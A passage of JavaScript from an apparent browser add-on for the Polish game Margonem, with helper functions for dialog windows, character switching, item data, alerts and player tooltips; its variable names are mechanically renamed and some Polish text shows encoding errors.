    const cardWindowHasListFeature = (window.innerHeight - cardWindowUniqueIdentifier) / 2;
    const cardWindowCustomTitleString = {
      zIndex: 999,
      position: "absolute",
      left: cardWindowIsResizableFlag + "px",
      top: cardWindowHasListFeature + "px"
    };
    gridWindowUpdatedCoordinatesPayload.css(cardWindowCustomTitleString);
  });
}
export async function editUrlWindow(cardWindowUiElementReference, cardWindowDragConfiguration) {
  return new Promise(cardWindowStopPositionLeft => {
    const cardWindowStopPositionTop = $("#mp-overlay-url");

    if (cardWindowStopPositionTop.length > 0) {
      cardWindowStopPositionTop.remove();
    }

    const cardWindowFinalCoordinatePayload = $("\n        <div id=\"mp-overlay-url\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Aktualny adres powiadomienia <b>" + cardWindowUiElementReference + "</b> to:</div>\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Adres powiadomienia\" value=\"" + cardWindowDragConfiguration + "\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Zapisz</div>\n                    <div id=\"defaultBtn\" class=\"mp-button do-action-cursor\" style=\"width: 100px;\">Domyślne</div>\n                </div>\n                <div class=\"mp-url-name\">Wrzuć swój dźwięk <a class=\"do-action-cursor mp-url\" href=\"https://margoplus.pl/mp3/\" target=\"_blank\">tutaj</a>.</div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      cardWindowFinalCoordinatePayload.find(".mp-default-input").trigger("focus");
    }, 10);

    function cardWindowDomAppendReference() {
      cardWindowFinalCoordinatePayload.remove();
    }

    cardWindowFinalCoordinatePayload.find("#saveBtn").click(() => {
      const cardWindowInnerContentClass = cardWindowFinalCoordinatePayload.find("#mp-input-url").val();
      cardWindowDomAppendReference();
      cardWindowStopPositionLeft(cardWindowInnerContentClass);
    });
    cardWindowFinalCoordinatePayload.find("#defaultBtn").click(() => {
      cardWindowDomAppendReference();
      message("PrzywrĂłcono domyślny adres");
      cardWindowStopPositionLeft("default");
    });
    cardWindowFinalCoordinatePayload.find("#closeBtn").click(() => {
      cardWindowDomAppendReference();
      cardWindowStopPositionLeft(null);
    });
    cardWindowFinalCoordinatePayload.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (cardWindowInitialCenteredFlag, cardWindowDragStartEvent) => {}
    });
    const cardWindowDragStartUi = cardWindowFinalCoordinatePayload.outerWidth();
    const cardWindowUpdatedCoordinatesPayload = cardWindowFinalCoordinatePayload.outerHeight();
    const cardWindowInitialAppendReference = (window.innerWidth - cardWindowDragStartUi) / 2;
    const cardWindowCenteredModeFlag = (window.innerHeight - cardWindowUpdatedCoordinatesPayload) / 2;
    const listStorageConfigId = {
      zIndex: 999,
      position: "absolute",
      left: cardWindowInitialAppendReference + "px",
      top: cardWindowCenteredModeFlag + "px"
    };
    cardWindowFinalCoordinatePayload.css(listStorageConfigId);
  });
}
export async function sendAlert() {
  return new Promise(listStorageConfigurationObject => {
    const listWindowTemplateClass = $("#mp-overlay-send-alert");

    if (listWindowTemplateClass.length > 0) {
      listWindowTemplateClass.remove();
    }

    const listWindowUniqueIdentifier = $("\n        <div id=\"mp-overlay-send-alert\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">OgĹoszenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-send-alert-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"TreĹÄ\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">Wyślij</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      listWindowUniqueIdentifier.find(".mp-default-input").trigger("focus");
    }, 10);

    function listWindowIsResizableFlag() {
      listWindowUniqueIdentifier.remove();
    }

    listWindowUniqueIdentifier.find("#sendBtn").click(() => {
      const listWindowHasListFeature = listWindowUniqueIdentifier.find("#mp-input-url").val();
      listWindowIsResizableFlag();
      listStorageConfigurationObject(listWindowHasListFeature);
    });
    listWindowUniqueIdentifier.find("#closeBtn").click(() => {
      listWindowIsResizableFlag();
      listStorageConfigurationObject(null);
    });
    listWindowUniqueIdentifier.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (listWindowCustomTitleString, listWindowUiElementReference) => {}
    });
    const listWindowDragConfiguration = listWindowUniqueIdentifier.outerWidth();
    const listWindowStopPositionLeft = listWindowUniqueIdentifier.outerHeight();
    const listWindowStopPositionTop = (window.innerWidth - listWindowDragConfiguration) / 2;
    const listWindowFinalCoordinatePayload = (window.innerHeight - listWindowStopPositionLeft) / 2;
    const listWindowDomAppendReference = {
      zIndex: 999,
      position: "absolute",
      left: listWindowStopPositionTop + "px",
      top: listWindowFinalCoordinatePayload + "px"
    };
    listWindowUniqueIdentifier.css(listWindowDomAppendReference);
  });
}
export async function loadUmConfig() {
  return new Promise(listWindowInnerContentClass => {
    const listWindowInitialCenteredFlag = $("#mp-overlay-learn-um");

    if (listWindowInitialCenteredFlag.length > 0) {
      listWindowInitialCenteredFlag.remove();
    }

    const listWindowDragStartEvent = $("\n        <div id=\"mp-overlay-learn-um\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">UmiejÄtnoĹci</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-learn-um-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Kod umiejÄtnoĹci z Gargonem.pl\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">Naucz</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      listWindowDragStartEvent.find(".mp-default-input").trigger("focus");
    }, 10);

    function listWindowDragStartUi() {
      listWindowDragStartEvent.remove();
    }

    listWindowDragStartEvent.find("#sendBtn").click(() => {
      const listWindowUpdatedCoordinatesPayload = listWindowDragStartEvent.find("#mp-input-url").val();
      listWindowDragStartUi();
      listWindowInnerContentClass(listWindowUpdatedCoordinatesPayload);
    });
    listWindowDragStartEvent.find("#closeBtn").click(() => {
      listWindowDragStartUi();
      listWindowInnerContentClass(null);
    });
    const listWindowInitialAppendReference = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (listWindowCenteredModeFlag, menuStorageConfigId) => {}
    };
    listWindowDragStartEvent.appendTo("#mp-root").draggable(listWindowInitialAppendReference);
    const menuStorageConfigurationObject = listWindowDragStartEvent.outerWidth();
    const menuWindowTemplateClass = listWindowDragStartEvent.outerHeight();
    const menuWindowUniqueIdentifier = (window.innerWidth - menuStorageConfigurationObject) / 2;
    const menuWindowIsResizableFlag = (window.innerHeight - menuWindowTemplateClass) / 2;
    const menuWindowHasListFeature = {
      zIndex: 999,
      position: "absolute",
      left: menuWindowUniqueIdentifier + "px",
      top: menuWindowIsResizableFlag + "px"
    };
    listWindowDragStartEvent.css(menuWindowHasListFeature);
  });
}
export async function loadConfig() {
  return new Promise(menuWindowCustomTitleString => {
    const menuWindowUiElementReference = $("#mp-overlay-load-config");

    if (menuWindowUiElementReference.length > 0) {
      menuWindowUiElementReference.remove();
    }

    const menuWindowDragConfiguration = $("\n        <div id=\"mp-overlay-load-config\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Konfiguracja</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-load-config-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Podaj ciÄg znaków konfiguracji\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">ZaĹaduj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      menuWindowDragConfiguration.find(".mp-default-input").trigger("focus");
    }, 10);

    function menuWindowStopPositionLeft() {
      menuWindowDragConfiguration.remove();
    }

    menuWindowDragConfiguration.find("#sendBtn").click(() => {
      const menuWindowStopPositionTop = menuWindowDragConfiguration.find("#mp-input-url").val();
      menuWindowStopPositionLeft();
      menuWindowCustomTitleString(menuWindowStopPositionTop);
    });
    menuWindowDragConfiguration.find("#closeBtn").click(() => {
      menuWindowStopPositionLeft();
      menuWindowCustomTitleString(null);
    });
    menuWindowDragConfiguration.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (menuWindowFinalCoordinatePayload, menuWindowDomAppendReference) => {}
    });
    const menuWindowInnerContentClass = menuWindowDragConfiguration.outerWidth();
    const menuWindowInitialCenteredFlag = menuWindowDragConfiguration.outerHeight();
    const menuWindowDragStartEvent = (window.innerWidth - menuWindowInnerContentClass) / 2;
    const menuWindowDragStartUi = (window.innerHeight - menuWindowInitialCenteredFlag) / 2;
    const menuWindowUpdatedCoordinatesPayload = {
      zIndex: 999,
      position: "absolute",
      left: menuWindowDragStartEvent + "px",
      top: menuWindowDragStartUi + "px"
    };
    menuWindowDragConfiguration.css(menuWindowUpdatedCoordinatesPayload);
  });
}
export function executeLoginChar(menuWindowInitialAppendReference, menuWindowCenteredModeFlag) {
  const navStorageConfigId = Engine.hero.d.id;
  const navStorageConfigurationObject = location.host.split(".")[0];

  if (menuWindowInitialAppendReference == navStorageConfigId) {
    return message("Jesteś na tej postaci!");
  }

  const navWindowTemplateClass = new Date(Date.now() + 2592000000);
  setCookie("mchar_id", menuWindowInitialAppendReference, navWindowTemplateClass, "/", "margonem.pl");

  if (menuWindowCenteredModeFlag !== navStorageConfigurationObject) {
    location.replace("https://" + menuWindowCenteredModeFlag + ".margonem.pl");
  } else {
    location.reload();
  }
}
export async function closeAlert(navWindowUniqueIdentifier = 20) {
  let navWindowIsResizableFlag = 0;

  while (!document.querySelector("div.window-backdrop") && navWindowIsResizableFlag < navWindowUniqueIdentifier) {
    await new Promise(navWindowHasListFeature => setTimeout(navWindowHasListFeature, 100));
    navWindowIsResizableFlag++;
  }

  if (navWindowIsResizableFlag >= navWindowUniqueIdentifier) {
    return;
  }

  try {
    const navWindowCustomTitleString = document.querySelector("div.text[name=\"Wiadomość\"]")?.parentElement?.parentElement?.parentElement;
    const navWindowUiElementReference = document.querySelector("div.window-backdrop");

    if (navWindowCustomTitleString && navWindowUiElementReference) {
      navWindowCustomTitleString.remove();
      navWindowUiElementReference.remove();
    }
  } catch (navWindowDragConfiguration) {
    console.error(navWindowDragConfiguration);
  }
}
export function getDataItem(navWindowStopPositionLeft) {
  var navWindowStopPositionTop = Engine.items.fetchLocationItems("g");

  for (const navWindowFinalCoordinatePayload in navWindowStopPositionTop) {
    if (navWindowStopPositionTop[navWindowFinalCoordinatePayload].id == navWindowStopPositionLeft) {
      var navWindowDomAppendReference = navWindowStopPositionTop[navWindowFinalCoordinatePayload]._cachedStats;
      const navWindowInnerContentClass = navWindowDomAppendReference.enhancement_upgrade_lvl === undefined ? 0 : navWindowDomAppendReference.enhancement_upgrade_lvl;
      const navWindowInitialCenteredFlag = navWindowDomAppendReference.bonus_not_selected === undefined ? true : false;
      const navWindowDragStartEvent = navWindowDomAppendReference.binds === null ? true : false;
      const navWindowDragStartUi = {
        id: navWindowStopPositionTop[navWindowFinalCoordinatePayload].id,
        name: navWindowStopPositionTop[navWindowFinalCoordinatePayload].name,
        rarity: navWindowStopPositionTop[navWindowFinalCoordinatePayload].itemTypeName,
        type: navWindowStopPositionTop[navWindowFinalCoordinatePayload].itemType,
        icon: navWindowStopPositionTop[navWindowFinalCoordinatePayload].icon,
        cl: navWindowStopPositionTop[navWindowFinalCoordinatePayload].cl,
        pr: navWindowStopPositionTop[navWindowFinalCoordinatePayload].pr,
        stat: navWindowStopPositionTop[navWindowFinalCoordinatePayload].stat,
        prc: "zl",
        upgrade: navWindowInnerContentClass,
        selectedBonus: navWindowInitialCenteredFlag,
        binds: navWindowDragStartEvent
      };
      return navWindowDragStartUi;
    }
  }

  return null;
}
export function loadScript(navWindowUpdatedCoordinatesPayload) {
  return new Promise((navWindowInitialAppendReference, navWindowCenteredModeFlag) => {
    const btnStorageConfigId = document.createElement("script");
    btnStorageConfigId.src = navWindowUpdatedCoordinatesPayload;

    btnStorageConfigId.onload = () => navWindowInitialAppendReference();

    btnStorageConfigId.onerror = () => navWindowCenteredModeFlag(new Error("Nie można załadować " + navWindowUpdatedCoordinatesPayload));

    document.head.appendChild(btnStorageConfigId);
  });
}

function waitForAPI(btnStorageConfigurationObject = 20000) {
  return new Promise((btnWindowTemplateClass, btnWindowUniqueIdentifier) => {
    const btnWindowIsResizableFlag = Date.now();

    function btnWindowHasListFeature() {
      if (window.API?.addCallbackToEvent) {
        btnWindowTemplateClass();
      } else if (Date.now() - btnWindowIsResizableFlag > btnStorageConfigurationObject) {
        btnWindowUniqueIdentifier(new Error("API not found within timeout"));
      } else {
        setTimeout(btnWindowHasListFeature, 100);
      }
    }

    btnWindowHasListFeature();
  });
}

export async function waitForAPIAndAttachCallback(btnWindowCustomTitleString, btnWindowUiElementReference) {
  try {
    await waitForAPI();
    window.API.addCallbackToEvent(btnWindowCustomTitleString, btnWindowUiElementReference);
  } catch (btnWindowDragConfiguration) {
    console.error(btnWindowDragConfiguration);
  }
}
export function createButtonPlay(btnWindowStopPositionLeft) {
  const btnWindowStopPositionTop = $("<div class=\"mp-button do-action-cursor\"><div class=\"mp-icon-play " + btnWindowStopPositionLeft + "\"></div></div>");
  return btnWindowStopPositionTop;
}
export function parseAbbreviatedNumber(btnWindowFinalCoordinatePayload) {
  if (typeof btnWindowFinalCoordinatePayload === "number") {
    return btnWindowFinalCoordinatePayload;
  }

  const btnWindowDomAppendReference = String(btnWindowFinalCoordinatePayload).trim().toLowerCase();
  const btnWindowInnerContentClass = btnWindowDomAppendReference.match(/^([\d.,]+)\s*([kmg])?$/i);

  if (!btnWindowInnerContentClass) {
    const btnWindowInitialCenteredFlag = parseFloat(btnWindowDomAppendReference.replace(",", "."));

    if (isNaN(btnWindowInitialCenteredFlag)) {
      return null;
    } else {
      return btnWindowInitialCenteredFlag;
    }
  }

  const btnWindowDragStartEvent = parseFloat(btnWindowInnerContentClass[1].replace(",", "."));
  const btnWindowDragStartUi = btnWindowInnerContentClass[2];

  if (isNaN(btnWindowDragStartEvent)) {
    return null;
  }

  switch (btnWindowDragStartUi) {
    case "k":
      return btnWindowDragStartEvent * 1000;

    case "m":
      return btnWindowDragStartEvent * 1000000;

    case "g":
      return btnWindowDragStartEvent * 1000000000;

    default:
      return btnWindowDragStartEvent;
  }
}
export function parsedGold(btnWindowUpdatedCoordinatesPayload) {
  var btnWindowInitialAppendReference = btnWindowUpdatedCoordinatesPayload.toString().length > 9 ? 12 : 10;
  var btnWindowCenteredModeFlag = btnWindowUpdatedCoordinatesPayload.toString().length > 9 ? "." : " ";
  return round(btnWindowUpdatedCoordinatesPayload, btnWindowInitialAppendReference, btnWindowCenteredModeFlag, 3);
}
export function createSettingsButton(iconStorageConfigId) {
  const iconStorageConfigurationObject = $("<div class=\"mp-window-settings-button do-action-cursor\"></div>").tip(iconStorageConfigId);
  return iconStorageConfigurationObject;
}
export function createSearchButton(iconWindowTemplateClass) {
  const iconWindowUniqueIdentifier = $("<div class=\"mp-window-search-button do-action-cursor\"></div>").tip(iconWindowTemplateClass);
  return iconWindowUniqueIdentifier;
}
export function createRefreshButton(iconWindowIsResizableFlag) {
  const iconWindowHasListFeature = $("<div class=\"mp-window-refresh-button do-action-cursor\"></div>").tip(iconWindowIsResizableFlag);
  return iconWindowHasListFeature;
}
export function createInput(iconWindowCustomTitleString, iconWindowUiElementReference = "Wpisz tekst", iconWindowDragConfiguration = 100) {
  const iconWindowStopPositionLeft = {
    width: iconWindowDragConfiguration + "px"
  };
  const iconWindowStopPositionTop = $("<input type=\"" + iconWindowCustomTitleString + "\" class=\"mp-default-input do-action-cursor\" placeholder=\"" + iconWindowUiElementReference + "\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\"/>").css(iconWindowStopPositionLeft);
  return iconWindowStopPositionTop;
}
export function getPercent(iconWindowFinalCoordinatePayload, iconWindowDomAppendReference) {
  if (iconWindowDomAppendReference === 0) {
    return 0;
  }

  return Math.floor(iconWindowFinalCoordinatePayload * 100 / iconWindowDomAppendReference);
}
export function waitForElement(iconWindowInnerContentClass, iconWindowInitialCenteredFlag = 9999999999) {
  return new Promise((iconWindowDragStartEvent, iconWindowDragStartUi) => {
    const iconWindowUpdatedCoordinatesPayload = $(iconWindowInnerContentClass);

    if (iconWindowUpdatedCoordinatesPayload.length > 0) {
      return iconWindowDragStartEvent(iconWindowUpdatedCoordinatesPayload);
    }

    const iconWindowInitialAppendReference = new MutationObserver(() => {
      const iconWindowCenteredModeFlag = $(iconWindowInnerContentClass);

      if (iconWindowCenteredModeFlag.length > 0) {
        iconWindowInitialAppendReference.disconnect();
        iconWindowDragStartEvent(iconWindowCenteredModeFlag);
      }
    });
    iconWindowInitialAppendReference.observe(document.body, {
      childList: true,
      subtree: true
    });
    setTimeout(() => {
      iconWindowInitialAppendReference.disconnect();
      iconWindowDragStartUi(new Error("Element " + iconWindowInnerContentClass + " not found within timeout."));
    }, iconWindowInitialCenteredFlag);
  });
}
export function upgradePercentMark(linkStorageConfigId) {
  const linkStorageConfigurationObject = {};

  for (const linkWindowTemplateClass of Object.values(linkStorageConfigId)) {
    if (linkWindowTemplateClass.id > 0) {
      linkStorageConfigurationObject[linkWindowTemplateClass.id] = linkWindowTemplateClass.p;
    }
  }

  for (const linkWindowUniqueIdentifier in linkStorageConfigurationObject) {
    const linkWindowIsResizableFlag = linkStorageConfigurationObject[linkWindowUniqueIdentifier];
    updateItem(".item-id-" + linkWindowUniqueIdentifier, "");
    updateItem(".mp-id-" + linkWindowUniqueIdentifier, "");
  }
}
export function removePercentMark(linkWindowHasListFeature) {
  const linkWindowCustomTitleString = $(".item-id-" + linkWindowHasListFeature);

  if (!linkWindowCustomTitleString.length) {
    return;
  }

  linkWindowCustomTitleString?.children(".upgrade-percent-box")?.remove();
}

function updateItem(linkWindowUiElementReference, linkWindowDragConfiguration) {
  const linkWindowStopPositionLeft = $(linkWindowUiElementReference);

  if (!linkWindowStopPositionLeft.length) {
    return;
  }

  let linkWindowStopPositionTop = linkWindowStopPositionLeft.children(".upgrade-percent-box");

  if (linkWindowStopPositionTop.length === 0) {
    linkWindowStopPositionLeft.append("<div class=\"upgrade-percent-box\">" + linkWindowDragConfiguration + "</div>");
  } else {
    linkWindowStopPositionTop.text(linkWindowDragConfiguration);
  }
}

export function getHealthColor(linkWindowFinalCoordinatePayload) {
  if (linkWindowFinalCoordinatePayload < 0) {
    linkWindowFinalCoordinatePayload = 0;
  }

  if (linkWindowFinalCoordinatePayload > 100) {
    linkWindowFinalCoordinatePayload = 100;
  }

  const linkWindowDomAppendReference = Math.floor((100 - linkWindowFinalCoordinatePayload) * 255 / 100);
  const linkWindowInnerContentClass = Math.floor(linkWindowFinalCoordinatePayload * 255 / 100);
  return "rgb(" + linkWindowDomAppendReference + "," + linkWindowInnerContentClass + ",0)";
}
export function extractId(linkWindowInitialCenteredFlag) {
  if (linkWindowInitialCenteredFlag.includes("=")) {
    return linkWindowInitialCenteredFlag.split("=")[0];
  }

  return linkWindowInitialCenteredFlag;
}
export function obliczProcent(linkWindowDragStartEvent, linkWindowDragStartUi) {
  let linkWindowUpdatedCoordinatesPayload = linkWindowDragStartEvent / linkWindowDragStartUi * 100;
  return linkWindowUpdatedCoordinatesPayload.toFixed(2);
}
export function sortAndTrimData(linkWindowInitialAppendReference, linkWindowCenteredModeFlag = 5) {
  const itemStorageConfigId = Object.entries(linkWindowInitialAppendReference);
  const itemStorageConfigurationObject = itemStorageConfigId.sort((itemWindowTemplateClass, itemWindowUniqueIdentifier) => itemWindowUniqueIdentifier[1].ts - itemWindowTemplateClass[1].ts);
  const itemWindowIsResizableFlag = itemStorageConfigurationObject.slice(0, linkWindowCenteredModeFlag);
  return Object.fromEntries(itemWindowIsResizableFlag);
}
export const AlertManager = function () {
  const itemWindowHasListFeature = {
    tl: "mp-alert-top-left",
    tc: "mp-alert-top-center",
    tr: "mp-alert-top-right",
    ml: "mp-alert-middle-left",
    mc: "mp-alert-middle-center",
    mr: "mp-alert-middle-right",
    bl: "mp-alert-bottom-left",
    bc: "mp-alert-bottom-center",
    br: "mp-alert-bottom-right"
  };
  const itemWindowCustomTitleString = {};

  function itemWindowUiElementReference(itemWindowDragConfiguration) {
    const itemWindowStopPositionLeft = document.createElement("div");
    itemWindowStopPositionLeft.className = "mp-alert-container do-action-cursor " + itemWindowHasListFeature[itemWindowDragConfiguration];
    document.body.appendChild(itemWindowStopPositionLeft);
    itemWindowCustomTitleString[itemWindowDragConfiguration] = itemWindowStopPositionLeft;
    return itemWindowStopPositionLeft;
  }

  function itemWindowStopPositionTop(itemWindowFinalCoordinatePayload, itemWindowDomAppendReference = "mc", itemWindowInnerContentClass = 3000) {
    if (!itemWindowHasListFeature[itemWindowDomAppendReference]) {
      console.warn("Nieprawidłowa pozycja:", itemWindowDomAppendReference);
      return;
    }

    const itemWindowInitialCenteredFlag = itemWindowCustomTitleString[itemWindowDomAppendReference] || itemWindowUiElementReference(itemWindowDomAppendReference);
    const itemWindowDragStartEvent = document.createElement("div");
    itemWindowDragStartEvent.className = "mp-alert";
    const itemWindowDragStartUi = document.createElement("div");
    itemWindowDragStartUi.className = "mp-alert-message";
    itemWindowDragStartUi.innerHTML = itemWindowFinalCoordinatePayload;
    itemWindowDragStartEvent.appendChild(itemWindowDragStartUi);
    const itemWindowUpdatedCoordinatesPayload = document.createElement("div");
    itemWindowUpdatedCoordinatesPayload.className = "mp-alert-progress";
    itemWindowUpdatedCoordinatesPayload.style.animationDuration = itemWindowInnerContentClass + "ms";
    itemWindowDragStartEvent.appendChild(itemWindowUpdatedCoordinatesPayload);
    itemWindowDragStartEvent.addEventListener("click", function () {
      itemWindowDragStartEvent?.classList?.add("fade-out");
      setTimeout(() => itemWindowDragStartEvent.remove(), 500);
    });
    itemWindowInitialCenteredFlag.appendChild(itemWindowDragStartEvent);
    setTimeout(() => {
      itemWindowDragStartEvent?.classList?.add("fade-out");
      setTimeout(() => itemWindowDragStartEvent.remove(), 500);
    }, itemWindowInnerContentClass);
  }

  const itemWindowInitialAppendReference = {
    addAlert: itemWindowStopPositionTop
  };
  return itemWindowInitialAppendReference;
}();
export function addStyle(itemWindowCenteredModeFlag, slotStorageConfigId = false, slotStorageConfigurationObject = false) {
  if (slotStorageConfigId && !slotStorageConfigurationObject) {
    const slotWindowTemplateClass = document.createElement("style");
    slotWindowTemplateClass.className = itemWindowCenteredModeFlag;
    slotWindowTemplateClass.textContent = slotStorageConfigId;
    document.head.appendChild(slotWindowTemplateClass);
  }

  if (!slotStorageConfigId && slotStorageConfigurationObject) {
    const slotWindowUniqueIdentifier = document.createElement("link");
    slotWindowUniqueIdentifier.className = itemWindowCenteredModeFlag;
    slotWindowUniqueIdentifier.rel = "stylesheet";
    slotWindowUniqueIdentifier.href = slotStorageConfigurationObject;
    document.head.appendChild(slotWindowUniqueIdentifier);
  }
}
export function removeStyle(slotWindowIsResizableFlag) {
  $("." + slotWindowIsResizableFlag)?.remove();
}
export function parseSecToTime(slotWindowHasListFeature) {
  const slotWindowCustomTitleString = Math.floor(slotWindowHasListFeature / 60);
  const slotWindowUiElementReference = Math.floor(slotWindowHasListFeature % 60);
  const slotWindowDragConfiguration = slotWindowCustomTitleString < 10 ? "0" + slotWindowCustomTitleString : slotWindowCustomTitleString;
  const slotWindowStopPositionLeft = slotWindowUiElementReference < 10 ? "0" + slotWindowUiElementReference : slotWindowUiElementReference;
  return slotWindowDragConfiguration + ":" + slotWindowStopPositionLeft;
}
export const replaceImageLinksWithImgTag = slotWindowStopPositionTop => {
  const slotWindowFinalCoordinatePayload = /(https?:\/\/[^\s]+?\.(?:png|jpe?g|gif|webp|svg))/gi;

  if (!slotWindowFinalCoordinatePayload.test(slotWindowStopPositionTop)) {
    return false;
  }

  slotWindowFinalCoordinatePayload.lastIndex = 0;
  return slotWindowStopPositionTop.replace(slotWindowFinalCoordinatePayload, slotWindowDomAppendReference => {
    return "<img class=\"do-action-cursor mp-chat-image\" src=\"" + slotWindowDomAppendReference + "\" onclick=\"window.open('" + slotWindowDomAppendReference + "', '_blank')\">";
  });
};
export function createUserTip(slotWindowInnerContentClass, slotWindowInitialCenteredFlag = "", slotWindowDragStartEvent, slotWindowDragStartUi) {
  const slotWindowUpdatedCoordinatesPayload = {
    "1": "Administrator",
    "2": "Mistrz Gry",
    "4": "Super Moderator Chatu",
    "16": "Super Mistrz Gry",
    "32": "Moderator Chatu",
    "99": "Admin Margonem Plus"
  };
  const slotWindowInitialAppendReference = slotWindowDragStartEvent[slotWindowInnerContentClass.account] ? 99 : slotWindowInnerContentClass.rank;
  const slotWindowCenteredModeFlag = slotWindowUpdatedCoordinatesPayload[slotWindowInnerContentClass.rank] ? "<div class=\"mp-tip-rank\">" + slotWindowUpdatedCoordinatesPayload[slotWindowInitialAppendReference] + "</div>" : "";
  const bagStorageConfigId = slotWindowInnerContentClass.clan ? "<div class=\"mp-clan-in-tip\">" + slotWindowInnerContentClass.clan + "</div><div class=\"mp-tip-line\"></div>" : "";
  const bagStorageConfigurationObject = slotWindowDragStartUi[slotWindowInnerContentClass.account] ? "<div class=\"mp-tip-line\"></div><div id=\"mp-neons\" class=\"mp-neons\">" + slotWindowDragStartUi[slotWindowInnerContentClass.account] + "</div>" : "";
  const bagWindowTemplateClass = slotWindowInitialCenteredFlag ? "<div class=\"mp-tip-line\"></div><div>" + slotWindowInitialCenteredFlag + "</div>" : "";
  const bagWindowUniqueIdentifier = slotWindowInnerContentClass.lvlop ? "<div class=\"mp-tip-line\"></div><div>Poziom operacyjny: " + slotWindowInnerContentClass.lvlop + "</div>" : "";
  const bagWindowIsResizableFlag = slotWindowInnerContentClass.icon ? slotWindowInnerContentClass.icon : slotWindowInnerContentClass.d.icon;
  return "\n            <div class=\"mp-tip-content\">\n                " + slotWindowCenteredModeFlag + "\n                <div class=\"info-wrapper\">\n                    <div class=\"nick\">" + slotWindowInnerContentClass.nick + " (" + slotWindowInnerContentClass.lvl + slotWindowInnerContentClass.prof + ")</div>\n                </div>\n                " + bagStorageConfigId + "\n                <div class=\"mp-outfit-animate\" style=\"background: url('https://micc.garmory-cdn.cloud/obrazki/postacie/" + bagWindowIsResizableFlag + "')\"></div>\n                " + bagStorageConfigurationObject + "\n                " + bagWindowTemplateClass + "\n                " + bagWindowUniqueIdentifier + "\n            </div>\n        ";
}
export async function initAdmin(bagWindowHasListFeature, bagWindowCustomTitleString) {
  function bagWindowUiElementReference() {
    const bagWindowDragConfiguration = Engine.whoIsHere.getList();

    for (const bagWindowStopPositionLeft in bagWindowDragConfiguration) {
      const bagWindowStopPositionTop = bagWindowDragConfiguration[bagWindowStopPositionLeft].$[0].firstElementChild;
      const bagWindowFinalCoordinatePayload = $(bagWindowStopPositionTop).attr("tip-id");
      const bagWindowDomAppendReference = bagWindowInnerContentClass(bagWindowStopPositionLeft);

      if (!bagWindowDomAppendReference) {
        continue;
      }

      const bagWindowInitialCenteredFlag = window.TIPS.allTips[bagWindowFinalCoordinatePayload]?.[0]?.innerHTML;
      const bagWindowDragStartEvent = bagWindowDomAppendReference.account;

      if (bagWindowInitialCenteredFlag !== undefined && bagWindowCustomTitleString[bagWindowDragStartEvent]) {
        const bagWindowDragStartUi = document.createElement("div");
        bagWindowDragStartUi.innerHTML = bagWindowInitialCenteredFlag;

        if (!bagWindowDragStartUi.querySelector("#mp-neons")) {
          const bagWindowUpdatedCoordinatesPayload = document.createElement("div");
          bagWindowUpdatedCoordinatesPayload.className = "mp-tip-line";

          if (bagWindowCustomTitleString[bagWindowDragStartEvent].length < 1) {
            bagWindowUpdatedCoordinatesPayload.style.display = "none";
          }

          const bagWindowInitialAppendReference = document.createElement("div");
